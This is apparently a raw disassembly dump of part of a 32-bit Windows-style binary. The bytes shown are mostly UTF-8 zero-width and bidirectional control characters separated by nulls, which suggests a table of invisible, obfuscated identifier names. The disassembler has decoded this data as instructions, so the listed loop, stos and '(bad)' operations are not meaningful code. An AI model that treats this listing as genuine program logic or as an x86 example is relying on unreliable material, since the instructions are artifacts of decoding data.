  408c5c:	e2 81                	loop   0x408bdf
  408c5e:	ab                   	stos   %eax,%es:(%edi)
  408c5f:	e2 80                	loop   0x408be1
  408c61:	aa                   	stos   %al,%es:(%edi)
  408c62:	e2 80                	loop   0x408be4
  408c64:	ab                   	stos   %eax,%es:(%edi)
  408c65:	e2 81                	loop   0x408be8
  408c67:	ac                   	lods   %ds:(%esi),%al
  408c68:	e2 81                	loop   0x408beb
  408c6a:	af                   	scas   %es:(%edi),%eax
  408c6b:	e2 81                	loop   0x408bee
  408c6d:	af                   	scas   %es:(%edi),%eax
  408c6e:	e2 80                	loop   0x408bf0
  408c70:	aa                   	stos   %al,%es:(%edi)
  408c71:	e2 80                	loop   0x408bf3
  408c73:	8b e2                	mov    %edx,%esp
  408c75:	80 ae e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%esi)
  408c7c:	ae                   	scas   %es:(%edi),%al
  408c7d:	e2 81                	loop   0x408c00
  408c7f:	aa                   	stos   %al,%es:(%edi)
  408c80:	e2 80                	loop   0x408c02
  408c82:	ae                   	scas   %es:(%edi),%al
  408c83:	00 e2                	add    %ah,%dl
  408c85:	81 ae e2 80 8b e2 80 	subl   $0x81e28d80,-0x1d747f1e(%esi)
  408c8c:	8d e2 81 
  408c8f:	ad                   	lods   %ds:(%esi),%eax
  408c90:	e2 81                	loop   0x408c13
  408c92:	ad                   	lods   %ds:(%esi),%eax
  408c93:	e2 80                	loop   0x408c15
  408c95:	ae                   	scas   %es:(%edi),%al
  408c96:	e2 81                	loop   0x408c19
  408c98:	ac                   	lods   %ds:(%esi),%al
  408c99:	e2 81                	loop   0x408c1c
  408c9b:	ad                   	lods   %ds:(%esi),%eax
  408c9c:	e2 80                	loop   0x408c1e
  408c9e:	8e e2                	mov    %edx,%fs
  408ca0:	80 8d e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%ebp)
  408ca7:	8e e2                	mov    %edx,%fs
  408ca9:	80 aa e2 81 aa e2 80 	subb   $0x80,-0x1d557e1e(%edx)
  408cb0:	ac                   	lods   %ds:(%esi),%al
  408cb1:	e2 80                	loop   0x408c33
  408cb3:	8f                   	(bad)
  408cb4:	e2 80                	loop   0x408c36
  408cb6:	ac                   	lods   %ds:(%esi),%al
  408cb7:	e2 80                	loop   0x408c39
  408cb9:	aa                   	stos   %al,%es:(%edi)
  408cba:	e2 80                	loop   0x408c3c
  408cbc:	8c e2                	mov    %fs,%edx
  408cbe:	81 ab e2 80 ae e2 81 	subl   $0x80e2ad81,-0x1d517f1e(%ebx)
  408cc5:	ad e2 80 
  408cc8:	8e e2                	mov    %edx,%fs
  408cca:	80 ad e2 80 ac e2 81 	subb   $0x81,-0x1d537f1e(%ebp)
  408cd1:	ad                   	lods   %ds:(%esi),%eax
  408cd2:	e2 80                	loop   0x408c54
  408cd4:	8c e2                	mov    %fs,%edx
  408cd6:	80 8c e2 80 ae e2 80 	orb    $0x8f,-0x7f1d5180(%edx,%eiz,8)
  408cdd:	8f 
  408cde:	e2 81                	loop   0x408c61
  408ce0:	ab                   	stos   %eax,%es:(%edi)
  408ce1:	e2 80                	loop   0x408c63
  408ce3:	8b e2                	mov    %edx,%esp
  408ce5:	80 8b e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%ebx)
  408cec:	ab                   	stos   %eax,%es:(%edi)
  408ced:	e2 80                	loop   0x408c6f
  408cef:	aa                   	stos   %al,%es:(%edi)
  408cf0:	e2 81                	loop   0x408c73
  408cf2:	aa                   	stos   %al,%es:(%edi)
  408cf3:	e2 80                	loop   0x408c75
  408cf5:	aa                   	stos   %al,%es:(%edi)
  408cf6:	e2 80                	loop   0x408c78
  408cf8:	8c e2                	mov    %fs,%edx
  408cfa:	80 ab e2 80 ae 00 e2 	subb   $0xe2,0xae80e2(%ebx)
  408d01:	80 8d e2 80 ad e2 81 	orb    $0x81,-0x1d527f1e(%ebp)
  408d08:	af                   	scas   %es:(%edi),%eax
  408d09:	e2 80                	loop   0x408c8b
  408d0b:	ae                   	scas   %es:(%edi),%al
  408d0c:	e2 80                	loop   0x408c8e
  408d0e:	ab                   	stos   %eax,%es:(%edi)
  408d0f:	e2 80                	loop   0x408c91
  408d11:	aa                   	stos   %al,%es:(%edi)
  408d12:	e2 81                	loop   0x408c95
  408d14:	ac                   	lods   %ds:(%esi),%al
  408d15:	e2 80                	loop   0x408c97
  408d17:	ad                   	lods   %ds:(%esi),%eax
  408d18:	e2 80                	loop   0x408c9a
  408d1a:	8c e2                	mov    %fs,%edx
  408d1c:	80 aa e2 80 8e e2 80 	subb   $0x80,-0x1d717f1e(%edx)
  408d23:	8e e2                	mov    %edx,%fs
  408d25:	80 8e e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%esi)
  408d2c:	8f                   	(bad)
  408d2d:	e2 81                	loop   0x408cb0
  408d2f:	ac                   	lods   %ds:(%esi),%al
  408d30:	e2 81                	loop   0x408cb3
  408d32:	ac                   	lods   %ds:(%esi),%al
  408d33:	e2 81                	loop   0x408cb6
  408d35:	ab                   	stos   %eax,%es:(%edi)
  408d36:	e2 80                	loop   0x408cb8
  408d38:	ae                   	scas   %es:(%edi),%al
  408d39:	e2 80                	loop   0x408cbb
  408d3b:	ae                   	scas   %es:(%edi),%al
  408d3c:	e2 81                	loop   0x408cbf
  408d3e:	aa                   	stos   %al,%es:(%edi)
  408d3f:	e2 81                	loop   0x408cc2
  408d41:	af                   	scas   %es:(%edi),%eax
  408d42:	e2 80                	loop   0x408cc4
  408d44:	ab                   	stos   %eax,%es:(%edi)
  408d45:	e2 81                	loop   0x408cc8
  408d47:	ad                   	lods   %ds:(%esi),%eax
  408d48:	e2 80                	loop   0x408cca
  408d4a:	8e e2                	mov    %edx,%fs
  408d4c:	80 ab e2 81 af e2 80 	subb   $0x80,-0x1d507e1e(%ebx)
  408d53:	ac                   	lods   %ds:(%esi),%al
  408d54:	e2 80                	loop   0x408cd6
  408d56:	ad                   	lods   %ds:(%esi),%eax
  408d57:	e2 80                	loop   0x408cd9
  408d59:	ae                   	scas   %es:(%edi),%al
  408d5a:	e2 80                	loop   0x408cdc
  408d5c:	8e e2                	mov    %edx,%fs
  408d5e:	80 ad e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%ebp)
  408d65:	ab                   	stos   %eax,%es:(%edi)
  408d66:	e2 81                	loop   0x408ce9
  408d68:	ab                   	stos   %eax,%es:(%edi)
  408d69:	e2 80                	loop   0x408ceb
  408d6b:	ae                   	scas   %es:(%edi),%al
  408d6c:	e2 80                	loop   0x408cee
  408d6e:	ad                   	lods   %ds:(%esi),%eax
  408d6f:	e2 81                	loop   0x408cf2
  408d71:	af                   	scas   %es:(%edi),%eax
  408d72:	e2 80                	loop   0x408cf4
  408d74:	ab                   	stos   %eax,%es:(%edi)
  408d75:	e2 80                	loop   0x408cf7
  408d77:	ab                   	stos   %eax,%es:(%edi)
  408d78:	e2 80                	loop   0x408cfa
  408d7a:	ae                   	scas   %es:(%edi),%al
  408d7b:	00 e2                	add    %ah,%dl
  408d7d:	81 ac e2 81 aa e2 80 	subl   $0x8d80e2ae,-0x7f1d557f(%edx,%eiz,8)
  408d84:	ae e2 80 8d 
  408d88:	e2 80                	loop   0x408d0a
  408d8a:	8f                   	(bad)
  408d8b:	e2 80                	loop   0x408d0d
  408d8d:	ab                   	stos   %eax,%es:(%edi)
  408d8e:	e2 80                	loop   0x408d10
  408d90:	8f                   	(bad)
  408d91:	e2 81                	loop   0x408d14
  408d93:	ab                   	stos   %eax,%es:(%edi)
  408d94:	e2 80                	loop   0x408d16
  408d96:	8c e2                	mov    %fs,%edx
  408d98:	81 ad e2 80 8d e2 81 	subl   $0x80e2af81,-0x1d727f1e(%ebp)
  408d9f:	af e2 80 
  408da2:	ad                   	lods   %ds:(%esi),%eax
  408da3:	e2 81                	loop   0x408d26
  408da5:	aa                   	stos   %al,%es:(%edi)
  408da6:	e2 80                	loop   0x408d28
  408da8:	ab                   	stos   %eax,%es:(%edi)
  408da9:	e2 80                	loop   0x408d2b
  408dab:	aa                   	stos   %al,%es:(%edi)
  408dac:	e2 81                	loop   0x408d2f
  408dae:	aa                   	stos   %al,%es:(%edi)
  408daf:	e2 80                	loop   0x408d31
  408db1:	ab                   	stos   %eax,%es:(%edi)
  408db2:	e2 80                	loop   0x408d34
  408db4:	ad                   	lods   %ds:(%esi),%eax
  408db5:	e2 81                	loop   0x408d38
  408db7:	af                   	scas   %es:(%edi),%eax
  408db8:	e2 80                	loop   0x408d3a
  408dba:	8b e2                	mov    %edx,%esp
  408dbc:	80 8f e2 81 aa e2 80 	orb    $0x80,-0x1d557e1e(%edi)
  408dc3:	8b e2                	mov    %edx,%esp
  408dc5:	81 ac e2 80 ac e2 81 	subl   $0x8c80e2af,-0x7e1d5380(%edx,%eiz,8)
  408dcc:	af e2 80 8c 
  408dd0:	e2 81                	loop   0x408d53
  408dd2:	ab                   	stos   %eax,%es:(%edi)
  408dd3:	e2 80                	loop   0x408d55
  408dd5:	ab                   	stos   %eax,%es:(%edi)
  408dd6:	e2 80                	loop   0x408d58
  408dd8:	8f                   	(bad)
  408dd9:	e2 80                	loop   0x408d5b
  408ddb:	ac                   	lods   %ds:(%esi),%al
  408ddc:	e2 80                	loop   0x408d5e
  408dde:	ad                   	lods   %ds:(%esi),%eax
  408ddf:	e2 80                	loop   0x408d61
  408de1:	ab                   	stos   %eax,%es:(%edi)
  408de2:	e2 81                	loop   0x408d65
  408de4:	ac                   	lods   %ds:(%esi),%al
  408de5:	e2 80                	loop   0x408d67
  408de7:	ac                   	lods   %ds:(%esi),%al
  408de8:	e2 81                	loop   0x408d6b
  408dea:	ab                   	stos   %eax,%es:(%edi)
  408deb:	e2 81                	loop   0x408d6e
  408ded:	ad                   	lods   %ds:(%esi),%eax
  408dee:	e2 81                	loop   0x408d71
  408df0:	ab                   	stos   %eax,%es:(%edi)
  408df1:	e2 80                	loop   0x408d73
  408df3:	ab                   	stos   %eax,%es:(%edi)
  408df4:	e2 80                	loop   0x408d76
  408df6:	ae                   	scas   %es:(%edi),%al
  408df7:	00 e2                	add    %ah,%dl
  408df9:	80 ad e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%ebp)
  408e00:	8c e2                	mov    %fs,%edx
  408e02:	80 ad e2 80 8d e2 81 	subb   $0x81,-0x1d727f1e(%ebp)
  408e09:	af                   	scas   %es:(%edi),%eax
  408e0a:	e2 80                	loop   0x408d8c
  408e0c:	ad                   	lods   %ds:(%esi),%eax
  408e0d:	e2 80                	loop   0x408d8f
  408e0f:	ae                   	scas   %es:(%edi),%al
  408e10:	e2 80                	loop   0x408d92
  408e12:	8e e2                	mov    %edx,%fs
  408e14:	80 8b e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%ebx)
  408e1b:	ac                   	lods   %ds:(%esi),%al
  408e1c:	e2 81                	loop   0x408d9f
  408e1e:	ad                   	lods   %ds:(%esi),%eax
  408e1f:	e2 81                	loop   0x408da2
  408e21:	aa                   	stos   %al,%es:(%edi)
  408e22:	e2 80                	loop   0x408da4
  408e24:	8d                   	lea    (bad),%esp
  408e25:	e2 81                	loop   0x408da8
  408e27:	ab                   	stos   %eax,%es:(%edi)
  408e28:	e2 80                	loop   0x408daa
  408e2a:	8d                   	lea    (bad),%esp
  408e2b:	e2 80                	loop   0x408dad
  408e2d:	8f                   	(bad)
  408e2e:	e2 80                	loop   0x408db0
  408e30:	8c e2                	mov    %fs,%edx
  408e32:	81 ac e2 81 ab e2 80 	subl   $0xaa81e28b,-0x7f1d547f(%edx,%eiz,8)
  408e39:	8b e2 81 aa 
  408e3d:	e2 80                	loop   0x408dbf
  408e3f:	8f                   	(bad)
  408e40:	e2 80                	loop   0x408dc2
  408e42:	8e e2                	mov    %edx,%fs
  408e44:	80 ad e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%ebp)
  408e4b:	ad                   	lods   %ds:(%esi),%eax
  408e4c:	e2 81                	loop   0x408dcf
  408e4e:	ad                   	lods   %ds:(%esi),%eax
  408e4f:	e2 80                	loop   0x408dd1
  408e51:	8f                   	(bad)
  408e52:	e2 81                	loop   0x408dd5
  408e54:	af                   	scas   %es:(%edi),%eax
  408e55:	e2 80                	loop   0x408dd7
  408e57:	aa                   	stos   %al,%es:(%edi)
  408e58:	e2 80                	loop   0x408dda
  408e5a:	ac                   	lods   %ds:(%esi),%al
  408e5b:	e2 80                	loop   0x408ddd
  408e5d:	ac                   	lods   %ds:(%esi),%al
  408e5e:	e2 80                	loop   0x408de0
  408e60:	ae                   	scas   %es:(%edi),%al
  408e61:	e2 80                	loop   0x408de3
  408e63:	ae                   	scas   %es:(%edi),%al
  408e64:	e2 80                	loop   0x408de6
  408e66:	8c e2                	mov    %fs,%edx
  408e68:	81 ae e2 81 ab e2 80 	subl   $0x80e2ab80,-0x1d547e1e(%esi)
  408e6f:	ab e2 80 
  408e72:	ae                   	scas   %es:(%edi),%al
  408e73:	00 e2                	add    %ah,%dl
  408e75:	81 ac e2 80 8b e2 80 	subl   $0xac81e2ab,-0x7f1d7480(%edx,%eiz,8)
  408e7c:	ab e2 81 ac 
  408e80:	e2 80                	loop   0x408e02
  408e82:	8c e2                	mov    %fs,%edx
  408e84:	80 8d e2 80 8b e2 81 	orb    $0x81,-0x1d747f1e(%ebp)
  408e8b:	ab                   	stos   %eax,%es:(%edi)
  408e8c:	e2 80                	loop   0x408e0e
  408e8e:	8e e2                	mov    %edx,%fs
  408e90:	80 aa e2 80 8d e2 81 	subb   $0x81,-0x1d727f1e(%edx)
  408e97:	ac                   	lods   %ds:(%esi),%al
  408e98:	e2 81                	loop   0x408e1b
  408e9a:	af                   	scas   %es:(%edi),%eax
  408e9b:	e2 81                	loop   0x408e1e
  408e9d:	af                   	scas   %es:(%edi),%eax
  408e9e:	e2 80                	loop   0x408e20
  408ea0:	8f                   	(bad)
  408ea1:	e2 80                	loop   0x408e23
  408ea3:	8c e2                	mov    %fs,%edx
  408ea5:	80 8d e2 81 ac e2 80 	orb    $0x80,-0x1d537e1e(%ebp)
  408eac:	8f                   	(bad)
  408ead:	e2 80                	loop   0x408e2f
  408eaf:	ac                   	lods   %ds:(%esi),%al
  408eb0:	e2 80                	loop   0x408e32
  408eb2:	ab                   	stos   %eax,%es:(%edi)
  408eb3:	e2 81                	loop   0x408e36
  408eb5:	aa                   	stos   %al,%es:(%edi)
  408eb6:	e2 80                	loop   0x408e38
  408eb8:	ad                   	lods   %ds:(%esi),%eax
  408eb9:	e2 80                	loop   0x408e3b
  408ebb:	ab                   	stos   %eax,%es:(%edi)
  408ebc:	e2 80                	loop   0x408e3e
  408ebe:	ae                   	scas   %es:(%edi),%al
  408ebf:	e2 80                	loop   0x408e41
  408ec1:	ae                   	scas   %es:(%edi),%al
  408ec2:	e2 80                	loop   0x408e44
  408ec4:	8d                   	lea    (bad),%esp
  408ec5:	e2 81                	loop   0x408e48
  408ec7:	ad                   	lods   %ds:(%esi),%eax
  408ec8:	e2 81                	loop   0x408e4b
  408eca:	aa                   	stos   %al,%es:(%edi)
  408ecb:	e2 80                	loop   0x408e4d
  408ecd:	8b e2                	mov    %edx,%esp
  408ecf:	81 af e2 80 8b e2 81 	subl   $0x80e2ac81,-0x1d747f1e(%edi)
  408ed6:	ac e2 80 
  408ed9:	8f                   	(bad)
  408eda:	e2 81                	loop   0x408e5d
  408edc:	ad                   	lods   %ds:(%esi),%eax
  408edd:	e2 81                	loop   0x408e60
  408edf:	ad                   	lods   %ds:(%esi),%eax
  408ee0:	e2 80                	loop   0x408e62
  408ee2:	8b e2                	mov    %edx,%esp
  408ee4:	80 8d e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%ebp)
  408eeb:	ab                   	stos   %eax,%es:(%edi)
  408eec:	e2 80                	loop   0x408e6e
  408eee:	ae                   	scas   %es:(%edi),%al
  408eef:	00 e2                	add    %ah,%dl
  408ef1:	80 ac e2 80 8f e2 81 	subb   $0xae,-0x7e1d7080(%edx,%eiz,8)
  408ef8:	ae 
  408ef9:	e2 80                	loop   0x408e7b
  408efb:	8e e2                	mov    %edx,%fs
  408efd:	80 ad e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%ebp)
  408f04:	8b e2                	mov    %edx,%esp
  408f06:	81 ae e2 80 8f e2 80 	subl   $0x81e2ad80,-0x1d707f1e(%esi)
  408f0d:	ad e2 81 
  408f10:	aa                   	stos   %al,%es:(%edi)
  408f11:	e2 81                	loop   0x408e94
  408f13:	ab                   	stos   %eax,%es:(%edi)
  408f14:	e2 81                	loop   0x408e97
  408f16:	ad                   	lods   %ds:(%esi),%eax
  408f17:	e2 80                	loop   0x408e99
  408f19:	aa                   	stos   %al,%es:(%edi)
  408f1a:	e2 81                	loop   0x408e9d
  408f1c:	ad                   	lods   %ds:(%esi),%eax
  408f1d:	e2 81                	loop   0x408ea0
  408f1f:	ab                   	stos   %eax,%es:(%edi)
  408f20:	e2 80                	loop   0x408ea2
  408f22:	8e e2                	mov    %edx,%fs
  408f24:	81 ad e2 80 8d e2 81 	subl   $0x80e2af81,-0x1d727f1e(%ebp)
  408f2b:	af e2 80 
  408f2e:	8b e2                	mov    %edx,%esp
  408f30:	80 8b e2 80 8b e2 81 	orb    $0x81,-0x1d747f1e(%ebx)
  408f37:	ac                   	lods   %ds:(%esi),%al
  408f38:	e2 81                	loop   0x408ebb
  408f3a:	ac                   	lods   %ds:(%esi),%al
  408f3b:	e2 81                	loop   0x408ebe
  408f3d:	aa                   	stos   %al,%es:(%edi)
  408f3e:	e2 80                	loop   0x408ec0
  408f40:	8d                   	lea    (bad),%esp
  408f41:	e2 80                	loop   0x408ec3
  408f43:	8f                   	(bad)
  408f44:	e2 80                	loop   0x408ec6
  408f46:	8b e2                	mov    %edx,%esp
  408f48:	80 8c e2 81 ad e2 81 	orb    $0xaf,-0x7e1d527f(%edx,%eiz,8)
  408f4f:	af 
  408f50:	e2 81                	loop   0x408ed3
  408f52:	aa                   	stos   %al,%es:(%edi)
  408f53:	e2 81                	loop   0x408ed6
  408f55:	ab                   	stos   %eax,%es:(%edi)
  408f56:	e2 81                	loop   0x408ed9
  408f58:	aa                   	stos   %al,%es:(%edi)
  408f59:	e2 80                	loop   0x408edb
  408f5b:	8f                   	(bad)
  408f5c:	e2 80                	loop   0x408ede
  408f5e:	8e e2                	mov    %edx,%fs
  408f60:	80 ac e2 80 ab e2 80 	subb   $0xae,-0x7f1d5480(%edx,%eiz,8)
  408f67:	ae 
  408f68:	00 e2                	add    %ah,%dl
  408f6a:	81 af e2 80 8e e2 81 	subl   $0x81e2aa81,-0x1d717f1e(%edi)
  408f71:	aa e2 81 
  408f74:	ae                   	scas   %es:(%edi),%al
  408f75:	e2 80                	loop   0x408ef7
  408f77:	8e e2                	mov    %edx,%fs
  408f79:	80 8e e2 80 ac e2 81 	orb    $0x81,-0x1d537f1e(%esi)
  408f80:	ad                   	lods   %ds:(%esi),%eax
  408f81:	e2 80                	loop   0x408f03
  408f83:	ae                   	scas   %es:(%edi),%al
  408f84:	e2 80                	loop   0x408f06
  408f86:	8d                   	lea    (bad),%esp
  408f87:	e2 80                	loop   0x408f09
  408f89:	ad                   	lods   %ds:(%esi),%eax
  408f8a:	e2 81                	loop   0x408f0d
  408f8c:	ab                   	stos   %eax,%es:(%edi)
  408f8d:	e2 80                	loop   0x408f0f
  408f8f:	8f                   	(bad)
  408f90:	e2 80                	loop   0x408f12
  408f92:	ab                   	stos   %eax,%es:(%edi)
  408f93:	e2 81                	loop   0x408f16
  408f95:	aa                   	stos   %al,%es:(%edi)
  408f96:	e2 81                	loop   0x408f19
  408f98:	ad                   	lods   %ds:(%esi),%eax
  408f99:	e2 80                	loop   0x408f1b
  408f9b:	8d                   	lea    (bad),%esp
  408f9c:	e2 81                	loop   0x408f1f
  408f9e:	aa                   	stos   %al,%es:(%edi)
  408f9f:	e2 80                	loop   0x408f21
  408fa1:	8f                   	(bad)
  408fa2:	e2 81                	loop   0x408f25
  408fa4:	ae                   	scas   %es:(%edi),%al
  408fa5:	e2 80                	loop   0x408f27
  408fa7:	ad                   	lods   %ds:(%esi),%eax
  408fa8:	e2 81                	loop   0x408f2b
  408faa:	ae                   	scas   %es:(%edi),%al
  408fab:	e2 80                	loop   0x408f2d
  408fad:	8c e2                	mov    %fs,%edx
  408faf:	80 ab e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%ebx)
  408fb6:	ae                   	scas   %es:(%edi),%al
  408fb7:	e2 80                	loop   0x408f39
  408fb9:	8f                   	(bad)
  408fba:	e2 80                	loop   0x408f3c
  408fbc:	8f                   	(bad)
  408fbd:	e2 81                	loop   0x408f40
  408fbf:	ab                   	stos   %eax,%es:(%edi)
  408fc0:	e2 80                	loop   0x408f42
  408fc2:	8e e2                	mov    %edx,%fs
  408fc4:	80 8c e2 80 8d e2 80 	orb    $0x8f,-0x7f1d7280(%edx,%eiz,8)
  408fcb:	8f 
  408fcc:	e2 80                	loop   0x408f4e
  408fce:	8d                   	lea    (bad),%esp
  408fcf:	e2 81                	loop   0x408f52
  408fd1:	af                   	scas   %es:(%edi),%eax
  408fd2:	e2 80                	loop   0x408f54
  408fd4:	8b e2                	mov    %edx,%esp
  408fd6:	81 aa e2 81 ad e2 80 	subl   $0x80e2ac80,-0x1d527e1e(%edx)
  408fdd:	ac e2 80 
  408fe0:	ab                   	stos   %eax,%es:(%edi)
  408fe1:	e2 80                	loop   0x408f63
  408fe3:	ae                   	scas   %es:(%edi),%al
  408fe4:	00 e2                	add    %ah,%dl
  408fe6:	81 ab e2 81 ab e2 80 	subl   $0x80e28e80,-0x1d547e1e(%ebx)
  408fed:	8e e2 80 
  408ff0:	aa                   	stos   %al,%es:(%edi)
  408ff1:	e2 80                	loop   0x408f73
  408ff3:	aa                   	stos   %al,%es:(%edi)
  408ff4:	e2 80                	loop   0x408f76
  408ff6:	ae                   	scas   %es:(%edi),%al
  408ff7:	e2 80                	loop   0x408f79
  408ff9:	8c e2                	mov    %fs,%edx
  408ffb:	81 ae e2 81 ab e2 81 	subl   $0x80e2ae81,-0x1d547e1e(%esi)
  409002:	ae e2 80 
  409005:	8d                   	lea    (bad),%esp
  409006:	e2 80                	loop   0x408f88
  409008:	8b e2                	mov    %edx,%esp
  40900a:	81 ae e2 80 ad e2 81 	subl   $0x80e2ab81,-0x1d527f1e(%esi)
  409011:	ab e2 80 
  409014:	ae                   	scas   %es:(%edi),%al
  409015:	e2 80                	loop   0x408f97
  409017:	8d                   	lea    (bad),%esp
  409018:	e2 80                	loop   0x408f9a
  40901a:	ac                   	lods   %ds:(%esi),%al
  40901b:	e2 80                	loop   0x408f9d
  40901d:	8d                   	lea    (bad),%esp
  40901e:	e2 81                	loop   0x408fa1
  409020:	ab                   	stos   %eax,%es:(%edi)
  409021:	e2 80                	loop   0x408fa3
  409023:	ac                   	lods   %ds:(%esi),%al
  409024:	e2 80                	loop   0x408fa6
  409026:	aa                   	stos   %al,%es:(%edi)
  409027:	e2 81                	loop   0x408faa
  409029:	af                   	scas   %es:(%edi),%eax
  40902a:	e2 80                	loop   0x408fac
  40902c:	ad                   	lods   %ds:(%esi),%eax
  40902d:	e2 80                	loop   0x408faf
  40902f:	8e e2                	mov    %edx,%fs
  409031:	81 ab e2 80 ac e2 80 	subl   $0x80e28d80,-0x1d537f1e(%ebx)
  409038:	8d e2 80 
  40903b:	8f                   	(bad)
  40903c:	e2 80                	loop   0x408fbe
  40903e:	8b e2                	mov    %edx,%esp
  409040:	80 8f e2 80 8c e2 81 	orb    $0x81,-0x1d737f1e(%edi)
  409047:	ac                   	lods   %ds:(%esi),%al
  409048:	e2 80                	loop   0x408fca
  40904a:	ac                   	lods   %ds:(%esi),%al
  40904b:	e2 80                	loop   0x408fcd
  40904d:	8c e2                	mov    %fs,%edx
  40904f:	81 ae e2 81 aa e2 81 	subl   $0x81e2ad81,-0x1d557e1e(%esi)
  409056:	ad e2 81 
  409059:	ac                   	lods   %ds:(%esi),%al
  40905a:	e2 80                	loop   0x408fdc
  40905c:	ab                   	stos   %eax,%es:(%edi)
  40905d:	e2 80                	loop   0x408fdf
  40905f:	ae                   	scas   %es:(%edi),%al
  409060:	00 e2                	add    %ah,%dl
  409062:	80 8f e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%edi)
  409069:	ab                   	stos   %eax,%es:(%edi)
  40906a:	e2 80                	loop   0x408fec
  40906c:	8c e2                	mov    %fs,%edx
  40906e:	81 ac e2 80 8d e2 81 	subl   $0xae80e2ae,-0x7e1d7280(%edx,%eiz,8)
  409075:	ae e2 80 ae 
  409079:	e2 80                	loop   0x408ffb
  40907b:	aa                   	stos   %al,%es:(%edi)
  40907c:	e2 80                	loop   0x408ffe
  40907e:	ac                   	lods   %ds:(%esi),%al
  40907f:	e2 80                	loop   0x409001
  409081:	8c e2                	mov    %fs,%edx
  409083:	80 8e e2 80 8c e2 81 	orb    $0x81,-0x1d737f1e(%esi)
  40908a:	aa                   	stos   %al,%es:(%edi)
  40908b:	e2 81                	loop   0x40900e
  40908d:	ab                   	stos   %eax,%es:(%edi)
  40908e:	e2 81                	loop   0x409011
  409090:	ab                   	stos   %eax,%es:(%edi)
  409091:	e2 80                	loop   0x409013
  409093:	8f                   	(bad)
  409094:	e2 80                	loop   0x409016
  409096:	8c e2                	mov    %fs,%edx
  409098:	80 8b e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%ebx)
  40909f:	8f                   	(bad)
  4090a0:	e2 80                	loop   0x409022
  4090a2:	aa                   	stos   %al,%es:(%edi)
  4090a3:	e2 80                	loop   0x409025
  4090a5:	8c e2                	mov    %fs,%edx
  4090a7:	80 8f e2 80 ae e2 81 	orb    $0x81,-0x1d517f1e(%edi)
  4090ae:	ac                   	lods   %ds:(%esi),%al
  4090af:	e2 81                	loop   0x409032
  4090b1:	ab                   	stos   %eax,%es:(%edi)
  4090b2:	e2 80                	loop   0x409034
  4090b4:	ab                   	stos   %eax,%es:(%edi)
  4090b5:	e2 80                	loop   0x409037
  4090b7:	ab                   	stos   %eax,%es:(%edi)
  4090b8:	e2 81                	loop   0x40903b
  4090ba:	ad                   	lods   %ds:(%esi),%eax
  4090bb:	e2 80                	loop   0x40903d
  4090bd:	ab                   	stos   %eax,%es:(%edi)
  4090be:	e2 80                	loop   0x409040
  4090c0:	ae                   	scas   %es:(%edi),%al
  4090c1:	e2 80                	loop   0x409043
  4090c3:	8b e2                	mov    %edx,%esp
  4090c5:	80 ab e2 80 ae e2 80 	subb   $0x80,-0x1d517f1e(%ebx)
  4090cc:	ac                   	lods   %ds:(%esi),%al
  4090cd:	e2 80                	loop   0x40904f
  4090cf:	8c e2                	mov    %fs,%edx
  4090d1:	80 ad e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%ebp)
  4090d8:	ae                   	scas   %es:(%edi),%al
  4090d9:	00 e2                	add    %ah,%dl
  4090db:	80 8d e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%ebp)
  4090e2:	ab                   	stos   %eax,%es:(%edi)
  4090e3:	e2 81                	loop   0x409066
  4090e5:	ac                   	lods   %ds:(%esi),%al
  4090e6:	e2 80                	loop   0x409068
  4090e8:	aa                   	stos   %al,%es:(%edi)
  4090e9:	e2 81                	loop   0x40906c
  4090eb:	ad                   	lods   %ds:(%esi),%eax
  4090ec:	e2 80                	loop   0x40906e
  4090ee:	8e e2                	mov    %edx,%fs
  4090f0:	80 ad e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%ebp)
  4090f7:	8b e2                	mov    %edx,%esp
  4090f9:	80 8e e2 81 ae e2 80 	orb    $0x80,-0x1d517e1e(%esi)
  409100:	aa                   	stos   %al,%es:(%edi)
  409101:	e2 80                	loop   0x409083
  409103:	8e e2                	mov    %edx,%fs
  409105:	81 ae e2 80 8b e2 80 	subl   $0x80e2ab80,-0x1d747f1e(%esi)
  40910c:	ab e2 80 
  40910f:	8b e2                	mov    %edx,%esp
  409111:	81 ae e2 80 8f e2 81 	subl   $0x81e2ac81,-0x1d707f1e(%esi)
  409118:	ac e2 81 
  40911b:	ae                   	scas   %es:(%edi),%al
  40911c:	e2 80                	loop   0x40909e
  40911e:	8e e2                	mov    %edx,%fs
  409120:	80 ac e2 80 8f e2 80 	subb   $0xad,-0x7f1d7080(%edx,%eiz,8)
  409127:	ad 
  409128:	e2 80                	loop   0x4090aa
  40912a:	ab                   	stos   %eax,%es:(%edi)
  40912b:	e2 81                	loop   0x4090ae
  40912d:	ac                   	lods   %ds:(%esi),%al
  40912e:	e2 81                	loop   0x4090b1
  409130:	ab                   	stos   %eax,%es:(%edi)
  409131:	e2 80                	loop   0x4090b3
  409133:	8f                   	(bad)
  409134:	e2 81                	loop   0x4090b7
  409136:	ae                   	scas   %es:(%edi),%al
  409137:	e2 80                	loop   0x4090b9
  409139:	8f                   	(bad)
  40913a:	e2 81                	loop   0x4090bd
  40913c:	ac                   	lods   %ds:(%esi),%al
  40913d:	e2 80                	loop   0x4090bf
  40913f:	8d                   	lea    (bad),%esp
  409140:	e2 81                	loop   0x4090c3
  409142:	af                   	scas   %es:(%edi),%eax
  409143:	e2 80                	loop   0x4090c5
  409145:	aa                   	stos   %al,%es:(%edi)
  409146:	e2 80                	loop   0x4090c8
  409148:	ad                   	lods   %ds:(%esi),%eax
  409149:	e2 80                	loop   0x4090cb
  40914b:	aa                   	stos   %al,%es:(%edi)
  40914c:	e2 81                	loop   0x4090cf
  40914e:	af                   	scas   %es:(%edi),%eax
  40914f:	e2 80                	loop   0x4090d1
  409151:	ab                   	stos   %eax,%es:(%edi)
  409152:	e2 80                	loop   0x4090d4
  409154:	ae                   	scas   %es:(%edi),%al
